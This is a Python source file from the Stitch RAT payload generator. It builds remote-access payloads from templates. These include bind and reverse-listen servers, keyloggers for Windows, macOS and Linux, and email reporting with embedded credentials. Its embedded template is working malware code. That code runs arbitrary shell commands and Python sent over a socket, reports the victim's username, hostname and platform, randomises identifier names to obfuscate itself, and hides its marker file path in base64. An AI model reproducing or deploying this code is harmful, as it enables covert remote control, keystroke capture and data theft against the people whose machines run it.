# Copyright (c) 2017, Nathan Lopez
# Stitch is under the MIT license. See the LICENSE file at the root of the project for the detailed license terms.

import os
import sys
from st_aes import *
from random import randint, choice
from string import ascii_uppercase

keylogger_paths = "{}/Stitch/application/scripts/keyloggers/{}"
email_paths = "{}/Stitch/application/scripts/emails/{}"
reqs_path = "{}/Stitch/application/scripts/reqs/{}"
encrypt_paths = "{}/Stitch/application/scripts/encrypt/{}"
proto_paths = "{}/Stitch/application/scripts/protos/{}"
main_directory_path = os.path.split(os.path.abspath(os.getcwd()))[0]
st_obf = []
for n in range(0, 10):
    st_obf.append(''.join(choice(ascii_uppercase) for i in range(randint(1, 5))))

################################################################################
#                       st_main.py stitch_gen variables                        #
################################################################################
# idk what this does yet so it's staying how it is
main_imports = '''#!/usr/bin/env python
from st_utils import *

class stitch_payload():

    connected = False
'''


def add_bind_server(BHOST, BPORT, filename="bind_server.txt"):
    with open(proto_paths.format(main_directory_path, filename)) as pro:
        return pro.read().format(BHOST, BPORT) + "\n\n"


def add_listen_server(LHOST, LPORT, filename="server.txt"):
    with open(proto_paths.format(main_directory_path, filename)) as pro:
        return pro.read().format(LHOST, LPORT) + "\n\n"


def add_listen_bind_main(filename="listen_bind.txt"):
    with open(proto_paths.format(main_directory_path, filename)) as pro:
        return pro.read() + "\n\n"


def add_listen_main(filename="listen.txt"):
    with open(proto_paths.format(main_directory_path, filename)) as pro:
        return pro.read() + "\n\n"


def add_bind_main(filename="bind.txt"):
    with open(proto_paths.format(main_directory_path, filename)) as pro:
        return pro.read() + "\n\n"


def add_run_main():
    if sys.platform.startswith('darwin'):
        return '''
class AppDelegate(NSObject):
    def applicationDidFinishLaunching_(self, notification):
        st_thread = threading.Thread(target=main)
        st_thread.daemon = True
        st_thread.start()

def osx_main():
    app = NSApplication.sharedApplication()
    delegate = AppDelegate.alloc().init()
    NSApp().setDelegate_(delegate)
    AppHelper.runEventLoop()

if __name__ == '__main__':
    osx_main()
'''
    else:
        return '''
if __name__ == '__main__':
    main()
'''


################################################################################
#                       st_utils.py stitch_gen variables                       #
################################################################################
# idk what these do yet so ima leave them how they are
utils_imports = '''
import os
import re
import sys
import math
import socket
import base64
import shutil
import zipfile
import datetime
import requests
import StringIO
import platform
import threading
import subprocess
from st_protocol import *
from st_encryption import *
from mss import ScreenshotError
from time import strftime, sleep
from contextlib import contextmanager\n\n'''

utils_code = '''

sp = subprocess
N = True
T = False
{3} = send
{6} = sys.platform

def run_command({4}):
    subp = sp.Popen({4},shell=True,stdout=sp.PIPE,stderr=sp.PIPE)
    {0}, {5} = subp.communicate()
    if not {5}:
        if {0} == '':
            return "[+] Command successfully executed.\\n"
        else:
            return {0}
    return "[!] {{}}".format({5})

def start_command(command):
    try:
        subp = sp.Popen(command, shell=True,
             stdin=None, stdout=None, stderr=None, close_fds=True)
        return '[+] Command successfully started.\\n'
    except Exception as e:
        return '[!] {{}}\\n'.format(str(e))

def no_error({1}):
    if {1}.startswith("ERROR:") or {1}.startswith("[!]") :
        return T
    else:
        return N

def win_client(system = {6}):
    if system.startswith('win'):
        return N
    else:
        return T

def osx_client(system = {6}):
    if system.startswith('darwin'):
        return N
    else:
        return T

def lnx_client(system = {6}):
    if system.startswith('linux'):
        return N
    else:
        return T

def pyexec({7},client_socket,pylib=False):
    pyerror = None
    response = ''
    if pylib:
        try:
            exec {7}
        except Exception as e:
            {5} = "[!] PYEXEC(): {{}}".format(str(e))
            {3}(client_socket,{5})
    else:
        with stdoutIO() as s:
            try:
                exec {7}
            except Exception as e:
                {5} = "[!] PYEXEC(): {{}}".format(str(e))
                {3}(client_socket,{5})
        r = s.getvalue()
        {3}(client_socket,r)

def determine_cmd({4},{2}):
    if {4}.strip()[:6] == "pyexec":
        pyexec({4}.strip()[6:],{2})
    elif {4}.strip()[:5] == "pylib":
        pyexec({4}.strip()[5:],{2},pylib=True)
    else:
        output=run_command({4})
        {3}({2},output)

def get_user():
    if win_client():
        user = os.getenv('username')
    else:
        user = run_command('whoami')
    return user.strip()

def get_path():
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    path_name = "[{{}}@{{}}] {{}}>".format(user,hostname,current_dir)
    return path_name

def get_temp():
    if win_client():
        temp = "C:\\\\Windows\\\\Temp\\\\"
    else:
        temp = "/tmp/"
    return temp

def get_desktop():
    user = get_user()
    if win_client():
        {9} = os.path.join(os.getenv('userprofile'),'Desktop')
    elif osx_client():
        {9} = '/Users/{{}}/Desktop'.format(user)
        if not os.path.exists({9}):
            logname = run_command('logname')
            {9} = '/Users/{{}}/Desktop'.format(logname.strip())
    else:
        {9} = '/home/{{}}'.format(user)
    return {9}

def stitch_running():
    {8} = os.getpid()
    {9} = os.path.abspath(sys.argv[0])
    if {9}.endswith('.py') or {9}.endswith('.pyc'):
        {9} = 'python.exe'
    if win_client():
        {7} = base64.b64decode('QzpcV2luZG93c1xUZW1wOnN0c2hlbGwubG9n')
    else:
        {7} = base64.b64decode('L3RtcC8uc3RzaGVsbC5sb2c=')
    if os.path.exists({7}):
        with open({7},'r') as st:
            data = st.readlines()
            data[0] = str(data[0]).strip()
        if data[0] == {8}:
            if data[1] == {9}:
                return True
        if win_client():
            exists_cmd = 'wmic process where "ProcessID={{}}" get ExecutablePath'.format(data[0])
        else:
            exists_cmd = 'ps -p {{}} -o comm='.format(data[0])
        running = run_command(exists_cmd)
        if running:
            if data[1] in running.strip() or running.strip() in data[1]:
                return True
    with open({7},'w') as st:
        st.write('{{}}\\n{{}}'.format({8},{9}))
    return False

def zipdir(path, zipn):
    for root, dirs, files in os.walk(path):
        for file in files:
            zipn.write(os.path.join(root, file))

@contextmanager
def stdoutIO(stdout=None):
    prev = sys.stdout
    if stdout is None:
        stdout = StringIO.StringIO()
    sys.stdout = stdout
    yield stdout
    sys.stdout = prev

def client_handler({2}):
    user = get_user()
    hostname = platform.node()
    current_dir = os.getcwd()
    {8} = get_desktop()
    if os.path.exists({8}):
        os.chdir({8})
    try:
        {3}({2},'c3RpdGNoX3NoZWxs',encryption=False)
        {3}({2},abbrev, encryption=False)
        {3}({2},{6})
        {3}({2},{6})
        {3}({2},user)
        {3}({2},hostname)
        {3}({2},platform.platform())
        cmd_buffer=""
        while N:
            cmd_buffer = receive({2})
            if not cmd_buffer: break
            if cmd_buffer == "end_connection": break
            determine_cmd(str(cmd_buffer),{2})
        {2}.close()
    except Exception as e:
        if dbg:
            print e
        {2}.close()

dbg = False
nt_kl = keylogger()
script_dir = os.path.dirname(os.path.realpath(sys.argv[0]))\n\n
'''.format(st_obf[0], st_obf[1], st_obf[2], st_obf[3], st_obf[4], st_obf[5], st_obf[6],
           st_obf[7], st_obf[8], st_obf[9])


# windows st_running = 'C:\\Windows\\Temp:stshell.log'
# posix st_running = '/tmp/.stshell.log'
# st_obf[3] = send
# st_obf[4] = arg_list
# st_obf[5] = errors
# st_obf[6] = sys.platform

def win_reg_exists(filename="reg.txt"):
    with open(proto_paths.format(main_directory_path, filename)) as pro:
        return pro.read() + "\n\n"


def win_util_imports(filename="win_utils_reqs.txt"):
    with open(reqs_path.format(main_directory_path, filename)) as reqs:
        return reqs.read() + "\n\n"


def osx_util_imports(filename="osx_reqs.txt"):
    with open(reqs_path.format(main_directory_path, filename)) as reqs:
        return reqs.read() + "\n\n"


def lnx_util_imports(filename="lnx_reqs.txt"):
    with open(reqs_path.format(main_directory_path, filename)) as reqs:
        return reqs.read() + "\n\n"


################################################################################
#                       st_encryption.py stitch_gen variables                  #
################################################################################

def get_encryption(filename="encryption.txt"):
    with open(encrypt_paths.format(main_directory_path, filename)) as enc:
        return enc.read().format(st_obf[0], aes_encoded, aes_abbrev) + "\n\n"


################################################################################
#                       st_protocol.py stitch_gen variables                    #
################################################################################

def get_protocol(filename="protos.txt"):
    with open(proto_paths.format(main_directory_path, filename)) as pro:
        return pro.read() + "\n\n"


################################################################################
#                       st_win_keylogger.py stitch_gen variables               #
################################################################################

def get_win_keylogger(filename="windows_keylog.txt"):
    with open(keylogger_paths.format(main_directory_path, filename)) as log:
        return log.read() + "\n\n"


################################################################################
#                       st_osx_keylogger.py stitch_gen variables               #
################################################################################
def get_osx_keylogger(filename="osx_keylog.txt"):
    with open(keylogger_paths.format(main_directory_path, filename)) as log:
        return log.read() + "\n\n"


################################################################################
#                       st_lnx_keylogger.py stitch_gen variables               #
################################################################################

def get_lnx_keylogger(filename="lnx_keylog.txt"):
    with open(keylogger_paths.format(main_directory_path, filename)) as log:
        return log.read() + "\n\n"


################################################################################
#                        stitch_gen email implementation                       #
################################################################################


def email_imports(filename="imports.txt"):
    with open(email_paths.format(main_directory_path, filename)) as email:
        return email.read() + "\n\n"


def get_email(user, pwd, filename="get_email.txt"):
    with open(email_paths.format(main_directory_path, filename)) as email:
        return email.read().format(user, pwd) + "\n\n"


################################################################################
#                       st_requirments.py stitch_gen variables                 #
################################################################################

def get_requirements(filename="var_reqs.txt"):
    with open(reqs_path.format(main_directory_path, filename)) as reqs:
        return reqs.read() + "\n\n"
